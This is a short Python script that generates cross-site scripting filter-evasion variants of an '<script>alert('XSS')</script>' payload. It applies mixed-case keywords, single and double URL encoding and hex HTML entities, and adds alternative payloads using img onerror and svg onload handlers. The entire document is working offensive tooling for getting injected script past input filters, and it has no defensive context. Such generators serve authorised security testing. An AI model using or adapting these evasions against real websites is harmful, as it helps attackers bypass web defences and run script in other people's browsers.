import urllib.parse

def generate_evasions(base_payload):
    print(f"[+] Generating evasion variations for: {base_payload}\n")
    
    variations = {}

    # 1. Mixed Case Transformation
    variations["Mixed Case"] = base_payload.replace("script", "sCrIpt").replace("alert", "aLeRt")

    # 2. URL Encoding (Single & Double)
    url_encoded = urllib.parse.quote(base_payload)
    variations["Single URL Encoded"] = url_encoded
    variations["Double URL Encoded"] = urllib.parse.quote(url_encoded)

    # 3. HTML Entity Hex Encoding
    variations["HTML Hex Encoded"] = "".join([f"&#x{ord(c):02x};" for c in base_payload])

    # 4. Alternative Standard HTML Elements
    variations["Alternative Tag (Img)"] = "<img src=x onerror=alert(1)>"
    variations["Alternative Tag (Svg)"] = "<svg onload=alert(1)>"

    # Display the results clearly
    for technique, result in variations.items():
        print(f"[*] {technique}:")
        print(f"    {result}\n")
        
    return variations

if __name__ == "__main__":
    # Standard baseline test string
    sample_payload = "<script>alert('XSS')</script>"
    generate_evasions(sample_payload)
